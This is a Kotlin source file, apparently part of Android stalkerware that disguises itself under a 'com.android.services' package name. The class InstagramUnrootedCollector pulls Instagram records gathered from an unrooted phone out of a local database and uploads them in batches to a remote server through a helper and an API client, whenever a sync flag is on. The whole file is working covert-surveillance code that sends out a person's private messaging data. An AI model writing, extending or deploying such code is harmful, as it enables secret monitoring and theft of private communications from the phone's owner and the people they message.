package com.android.services.logs.collectors.im.unrooted


import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerThreeApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose

class InstagramUnrootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncInstagram) {
            try {
                val InstagramList = localDatabaseSource.selectInstagramUnrooteds()
                if (InstagramList.isNotEmpty()) {
                    val endId = InstagramList[InstagramList.size - 1].id
                    val startId = InstagramList[0].id
                    val mInstagramSender = RemoteServerHelper(
                        context,
                        AppConstants.INSTAGRAM_UNROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startId = startId,
                        endId = endId
                    )
                    mInstagramSender.upload(InstagramList)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.INSTAGRAM_UNROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.INSTAGRAM_UNROOTED_TYPE} Sync is Off")
        }
    }
}